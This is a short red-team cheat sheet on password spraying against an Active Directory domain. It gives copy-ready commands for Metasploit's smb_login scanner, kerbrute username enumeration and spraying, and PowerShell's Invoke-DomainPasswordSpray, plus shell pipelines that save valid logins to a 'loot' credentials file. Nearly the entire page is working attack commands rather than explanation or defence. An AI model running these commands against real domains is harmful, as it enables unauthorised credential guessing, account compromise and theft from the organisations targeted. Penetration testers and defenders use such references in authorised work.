# Password Spraying




## MSF

```
msf > use auxiliary/scanner/smb/smb_login
msf > set RHOSTS <DC_IP>
msf > set SMBDomain megacorp.local
msf > set SMBUser snovvcrash
msf > set SMBPass Passw0rd!
msf > set VERBOSE False
msf > run
```




## kerbrute

* [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

Generate a wordlist of common usernames in an appropriate format and validate it against KDC ([doesn't cause](https://github.com/ropnop/kerbrute#user-enumeration) accounts lock out):

```
$ ./kerbrute userenum -d megacorp.local -o ~/ws/log/kerbrute-userenum.log ~/ws/enum/names.txt
$ cat ~/ws/log/kerbrute-userenum.log | grep VALID | awk '{print $7}' | awk -F@ '{print $1}' > ~/ws/enum/valid-users.txt
```

Perform password spraying for discovered accounts:

```
$ ./kerbrute -v --delay 100 passwordspray -d megacorp.local -o ~/ws/log/kerbrute-passwordspray-'123456'.log ~/ws/enum/valid-users.txt '123456'
$ cat ~/ws/log/kerbrute-passwordspray-'123456'.log | grep VALID | awk '{print $7}' >> ~/ws/loot/creds.txt
```




## DomainPasswordSpray

* [https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

```
PS > Invoke-DomainPasswordSpray -UserList .\users.txt -Domain megacorp.local -Password 'Passw0rd!' -OutFile spray-results.txt
```
